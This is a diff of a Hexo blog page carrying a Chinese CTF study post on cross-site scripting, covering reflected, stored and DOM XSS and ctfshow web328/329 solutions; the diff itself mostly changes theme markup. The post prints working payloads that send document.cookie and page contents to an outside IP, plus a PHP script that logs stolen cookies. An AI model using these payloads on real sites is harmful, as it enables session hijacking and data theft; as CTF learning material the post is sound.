@@ -18,6 +18,9 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
+    
+    
+        
         <meta name="description" content="XSS又叫CSS(Cross Site Script)跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。 xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。	常见的输出函数有： ec">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XSS学习">
@@ -48,9 +51,8 @@
     
     <title>
         
-            XSS学习 -
+            XSS学习 | Personal Blog
         
-        Personal Blog
     </title>
 
     
@@ -66,7 +68,7 @@
 
     
         
-<link rel="stylesheet" href="/assets/build/styles.css">
+<link rel="stylesheet" href="/css/build/tailwind.css">
 
     
 
@@ -81,16 +83,16 @@
     
     
     
-
+    
     
         
-<script src="/js/libs/anime.min.js"></script>
+<script src="/js/build/libs/anime.min.js"></script>
 
     
 
     <script id="hexo-configurations">
     window.config = {"hostname":"li1x.github.io","root":"/","language":"en","path":"search.xml"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":4,"number":true,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Personal Blog","subtitle":{"text":["Loading"],"hitokoto":{"enable":true,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/home","icon":"fa-regular fa-house"},"tags":{"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"}},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder icon-space"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"Doit","show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":4,"number":true,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Personal Blog","subtitle":{"text":["Loading"],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/home","icon":"fa-regular fa-house"},"tags":{"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"}},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder icon-space"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"Doit","show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
     window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
     window.data = {"masonry":false};
   </script>
@@ -115,23 +117,22 @@
 <meta name="generator" content="Hexo 6.3.0"></head>
 
 
-<body>
-<div class="progress-bar-container">
-    
-        <span class="scroll-progress-bar"></span>
-    
 
-    
-        <span class="pjax-progress-bar"></span>
-<!--        <span class="swup-progress-icon">-->
-<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
-<!--        </span>-->
-    
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
 </div>
 
-
-
-    <style>
+<style>
     :root {
         --preloader-background-color: #fff;
         --preloader-text-color: #000;
@@ -219,28 +220,30 @@
             textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
         });
 
-        var animation = anime.timeline({loop: true})
+        var animation = anime.timeline({ loop: true })
             .add({
                 targets: '.ml13 .letter',
-                translateY: [40,0],
+                translateY: [20, 0],
                 translateZ: 0,
-                opacity: [0,1],
-                filter: ['blur(5px)', 'blur(0px)'], // Starting from blurred to unblurred
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
                 easing: "easeOutExpo",
-                duration: 1400,
-                delay: (el, i) => 300 + 30 * i,
-            }).add({
-                targets: '.ml13 .letter',
-                translateY: [0,-40],
-                opacity: [1,0],
-                filter: ['blur(0px)', 'blur(5px)'], // Ending from unblurred to blurred
-                easing: "easeInExpo",
                 duration: 1200,
-                delay: (el, i) => 100 + 30 * i,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
                 complete: function() {
-                    hidePreloader(); // Call hidePreloader after the animation completes
+                    hidePreloader();
                 }
-            });
+            }, '-=700');
+
 
         let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
 
@@ -278,15 +281,12 @@
 
 <main class="page-container" id="swup">
 
-    
+	
 
-    <div class="main-content-container">
-
-
-        <div class="main-content-header">
-            <header class="navbar-container px-6 md:px-12">
-
-    <div class="navbar-content ">
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
         <div class="left">
             
             <a class="logo-title" href="/">
@@ -390,7 +390,7 @@
     </div>
 
     <!-- Mobile sheet -->
-    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
         <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
             
                 
@@ -511,40 +511,37 @@
 </header>
 
 
-        </div>
+		</div>
 
-        <div class="main-content-body">
+		<div class="main-content-body transition-fade-up">
+			
 
-            
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
 
-            <div class="main-content">
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">XSS学习</h1>
+			</div>
+			
+		</div>
 
-                
-                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
-    <div class="article-content-container">
-
-        <div class="article-title relative w-full">
-            
-                <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">XSS学习</h1>
-                </div>
-            
-            </div>
-
-        
-            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
-                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-                    <img src="/images/redefine-avatar.svg">
-                </div>
-                <div class="info flex flex-col justify-between">
-                    <div class="author flex items-center">
-                        <span class="name text-default-text-color text-lg font-semibold">The Redefine Team</span>
-                        
-                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/redefine-avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">The Redefine Team</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
         <span class="desktop">2024-03-26 01:53:47</span>
@@ -604,16 +601,16 @@
     
 </div>
 
-                    </div>
-                </div>
-            </div>
-        
+				</div>
+			</div>
+		</div>
+		
 
-        
+		
 
 
-        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <p>XSS又叫CSS(Cross Site Script)跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>XSS又叫CSS(Cross Site Script)跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
 <p>xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。	常见的输出函数有： echo printf print print_r sprintf die var-dump var_export.</p>
 <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul>
 <li>攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）。</li>
@@ -623,7 +620,7 @@
 <h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p><strong>反射型XSS：</strong>&lt;非持久化&gt; 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内	容），一般容易出现在搜索页面。一般是后端代码进行处理</p>
 <p><strong>存储型XSS：</strong>&lt;持久化&gt; 代码是存储在服务器数据库中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</p>
 <p><strong>DOM型XSS：</strong>基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。一般是浏览器前端代码进行处理。</p>
-<h3 id="DOM型XSS："><a href="#DOM型XSS：" class="headerlink" title="DOM型XSS："></a><a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/p/12542695.html">DOM型XSS： <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><h4 id="场景一：innerHTML"><a href="#场景一：innerHTML" class="headerlink" title="场景一：innerHTML"></a>场景一：innerHTML</h4><h4 id="场景二：跳转"><a href="#场景二：跳转" class="headerlink" title="场景二：跳转"></a>场景二：跳转</h4><h4 id="场景三：eval"><a href="#场景三：eval" class="headerlink" title="场景三：eval"></a>场景三：eval</h4><h4 id="场景四：cookie、referer"><a href="#场景四：cookie、referer" class="headerlink" title="场景四：cookie、referer"></a>场景四：cookie、referer</h4><h4 id="场景五：document-write、document-URL-indexOf-“id-”"><a href="#场景五：document-write、document-URL-indexOf-“id-”" class="headerlink" title="场景五：document.write、document.URL.indexOf(“id&#x3D;”)"></a>场景五：document.write、document.URL.indexOf(“id&#x3D;”)</h4><p><strong>解释一些常用js代码的意思:</strong></p>
+<h3 id="DOM型XSS："><a href="#DOM型XSS：" class="headerlink" title="DOM型XSS："></a><a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/p/12542695.html">DOM型XSS：<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h3><h4 id="场景一：innerHTML"><a href="#场景一：innerHTML" class="headerlink" title="场景一：innerHTML"></a>场景一：innerHTML</h4><h4 id="场景二：跳转"><a href="#场景二：跳转" class="headerlink" title="场景二：跳转"></a>场景二：跳转</h4><h4 id="场景三：eval"><a href="#场景三：eval" class="headerlink" title="场景三：eval"></a>场景三：eval</h4><h4 id="场景四：cookie、referer"><a href="#场景四：cookie、referer" class="headerlink" title="场景四：cookie、referer"></a>场景四：cookie、referer</h4><h4 id="场景五：document-write、document-URL-indexOf-“id-”"><a href="#场景五：document-write、document-URL-indexOf-“id-”" class="headerlink" title="场景五：document.write、document.URL.indexOf(“id&#x3D;”)"></a>场景五：document.write、document.URL.indexOf(“id&#x3D;”)</h4><p><strong>解释一些常用js代码的意思:</strong></p>
 <p><code>onload</code>：事件处理程序，它会在网页加载完成后执行</p>
 <p><code>document.cookie</code>：截取当前网页所有cooies，cookies是存储在用户浏览器上的小型数据片段，通常用于识别用户或保存的设置</p>
 <p><code>location.href</code>：这会将当前网页的url重定向到 后面的地址</p>
@@ -642,9 +639,9 @@
 <p>&lt;img alert(1)&gt;</p>
 <body>alert(1)(</body>
 
-<h4 id="Xss-payload"><a href="#Xss-payload" class="headerlink" title="Xss payload"></a><a class="link" target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/340080.html">Xss payload <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h4><h4 id="1-无过滤"><a href="#1-无过滤" class="headerlink" title="1.无过滤"></a>1.无过滤</h4><p><code>&lt;script&gt;location.href=&quot;http://(自己服务器的公网ip)/127.php(存放上述php代码的文件)?cookie=&quot;+document.cookie&lt;/script&gt;</code></p>
+<h4 id="Xss-payload"><a href="#Xss-payload" class="headerlink" title="Xss payload"></a><a class="link" target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/340080.html">Xss payload<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h4><h4 id="1-无过滤"><a href="#1-无过滤" class="headerlink" title="1.无过滤"></a>1.无过滤</h4><p><code>&lt;script&gt;location.href=&quot;http://(自己服务器的公网ip)/127.php(存放上述php代码的文件)?cookie=&quot;+document.cookie&lt;/script&gt;</code></p>
 <p><code>&lt;script&gt; onload=location.href=&quot;http://39.103.98.109/127.php?cookie=&quot;+document.cookie&lt;/script&gt;</code></p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 127.php 创建在自己的站点的根目录下（payload中路径一样即可）</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">	<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line">	<span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);    <span class="comment"># a模式是追加模式（在文件末尾添加内容）</span></span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>,<span class="variable">$time</span>.<span class="string">&#x27;:    &#x27;</span>. <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 127.php 创建在自己的站点的根目录下（payload中路径一样即可）</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">	<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line">	<span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);    <span class="comment"># a模式是追加模式（在文件末尾添加内容）</span></span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>,<span class="variable">$time</span>.<span class="string">&#x27;:    &#x27;</span>. <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
 
 <h4 id="2-过滤script"><a href="#2-过滤script" class="headerlink" title="2.过滤script"></a>2.过滤script</h4><blockquote>
 <p><code>&lt;body onload=&quot;location.href=&#39;http://(自己服务器的公网ip)/127.php?cookie=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code></p>
@@ -663,7 +660,7 @@
 <p><strong>2.抓包改SESSION 发包：这里面需要发两次包  每次收到的包都要改SESSION再发送</strong></p>
 <p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/328-02.png"></p>
 <p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/XSS%E6%BC%8F%E6%B4%9E/328-03.png"></p>
-<h3 id="对于登录Cookie就失效的，无法伪造cookie："><a href="#对于登录Cookie就失效的，无法伪造cookie：" class="headerlink" title="对于登录Cookie就失效的，无法伪造cookie："></a>对于登录Cookie就失效的，无法伪造cookie：</h3><h4 id="法一：外带信息payload：（监听端口）"><a href="#法一：外带信息payload：（监听端口）" class="headerlink" title="法一：外带信息payload：（监听端口）"></a>法一：外带信息payload：（监听端口）</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、innerHTML:从对象的起始位置到终止位置的全部内容,不包括Html标签。 innerText可替代innerHTML</span><br><span class="line">2、outerHTML:除了包含innerHTML的全部内容外, 还包含对象标签本身。</span><br></pre></td></tr></table></figure></div>
+<h3 id="对于登录Cookie就失效的，无法伪造cookie："><a href="#对于登录Cookie就失效的，无法伪造cookie：" class="headerlink" title="对于登录Cookie就失效的，无法伪造cookie："></a>对于登录Cookie就失效的，无法伪造cookie：</h3><h4 id="法一：外带信息payload：（监听端口）"><a href="#法一：外带信息payload：（监听端口）" class="headerlink" title="法一：外带信息payload：（监听端口）"></a>法一：外带信息payload：（监听端口）</h4><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、innerHTML:从对象的起始位置到终止位置的全部内容,不包括Html标签。 innerText可替代innerHTML</span><br><span class="line">2、outerHTML:除了包含innerHTML的全部内容外, 还包含对象标签本身。</span><br></pre></td></tr></table></figure></div>
 
 <p><code>&lt;script&gt;window.open(&#39;http://39.103.98.109:10086/&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[1].innerHTML)&lt;/script&gt;</code></p>
 <p>-&gt; <code>window.open</code> 打开新链接</p>
@@ -692,7 +689,7 @@
 <li><code>var element = document.querySelector(selector);</code></li>
 </ul>
 <p>-&gt; selector 是一个字符串，表示要查找的元素的CSS选择器</p>
-<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过ID选择元素</span></span><br><span class="line">var elementById = document.querySelector(&#x27;#myId&#x27;);</span><br><span class="line"><span class="comment">// 通过类名选择元素</span></span><br><span class="line">var elementsByClass = document.querySelector(&#x27;.myClass&#x27;);</span><br><span class="line"><span class="comment">// 通过标签名选择元素</span></span><br><span class="line">var elementsByTagName = document.querySelector(&#x27;div&#x27;);</span><br><span class="line"><span class="comment">// 使用复杂的选择器，本题就是这种</span></span><br><span class="line">var complexSelector = document.querySelector(&#x27;div.container &gt; p<span class="punctuation">:</span>first-child&#x27;);</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过ID选择元素</span></span><br><span class="line">var elementById = document.querySelector(&#x27;#myId&#x27;);</span><br><span class="line"><span class="comment">// 通过类名选择元素</span></span><br><span class="line">var elementsByClass = document.querySelector(&#x27;.myClass&#x27;);</span><br><span class="line"><span class="comment">// 通过标签名选择元素</span></span><br><span class="line">var elementsByTagName = document.querySelector(&#x27;div&#x27;);</span><br><span class="line"><span class="comment">// 使用复杂的选择器，本题就是这种</span></span><br><span class="line">var complexSelector = document.querySelector(&#x27;div.container &gt; p<span class="punctuation">:</span>first-child&#x27;);</span><br></pre></td></tr></table></figure></div>
 
 <p><code>\#top &gt; div.layui-container</code> 可以将所有源码都读了, 最方便</p>
 <h2 id="web329-payload"><a href="#web329-payload" class="headerlink" title="web329 payload:"></a>web329 payload:</h2><p> <code>&lt;script&gt;var img = new Image();img.src = &quot;http://39.103.98.109:10086/&quot;+document.querySelector(&#39;#top &gt; div.layui-container &gt; div:nth-child(4) &gt; div &gt; div.layui-table-box &gt; div.layui-table-body.layui-table-main&#39;).textContent;document.body.append(img);&lt;/script&gt;</code></p>
@@ -700,7 +697,7 @@
 <p>new Image() 创建新的图像元素对象，并将其分配给了img变量.</p>
 </blockquote>
 <blockquote>
-<p>img.src &#x3D; “<a class="link" target="_blank" rel="noopener" href="http://120.46.41.173:9023/">http://120.46.41.173:9023/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“ +  document.querySelector(‘#top &gt; div.layui-container &gt;  div:nth-child(4) &gt; div &gt; div.layui-table-box &gt;  div.layui-table-body.layui-table-main’).textContent;</p>
+<p>img.src &#x3D; “<a class="link" target="_blank" rel="noopener" href="http://120.46.41.173:9023/">http://120.46.41.173:9023/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>“ +  document.querySelector(‘#top &gt; div.layui-container &gt;  div:nth-child(4) &gt; div &gt; div.layui-table-box &gt;  div.layui-table-body.layui-table-main’).textContent;</p>
 <p>这个设置了src属性，通过多个部分拼接，首先是地址 + document.querySelector()DOM查询操作 + textContent是获取DOM元素文本的内容的属性</p>
 </blockquote>
 <blockquote>
@@ -723,13 +720,13 @@
 <p>-&gt;<code>mthod:&quot;POST&quot;</code> 这是表明 此次HTTP请求的方法是POST方法</p>
 <p>-&gt; <code>data:&#123;&#39;p&#39;:&#39;1717&#39;&#125;</code> 这是参数及值</p>
 <hr>
-<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/133375048">参考ctfshow web入门 xss payload <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/133375048">参考ctfshow web入门 xss payload<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 
-        </div>
+		</div>
 
-        
-            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
-                <div class="article-copyright-info-container">
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
     <ul>
         <li><strong>Title:</strong> XSS学习</li>
         <li><strong>Author:</strong> The Redefine Team</li>
@@ -757,66 +754,60 @@
     </ul>
 </div>
 
-            </div>
-        
+		</div>
+		
 
-        
-            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
-                
-                    <li class="tag-item mx-0.5">
-                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">#漏洞学习</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item mx-0.5">
-                        <a href="/tags/Web/">#Web</a>&nbsp;
-                    </li>
-                
-            </ul>
-        
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">#漏洞学习</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
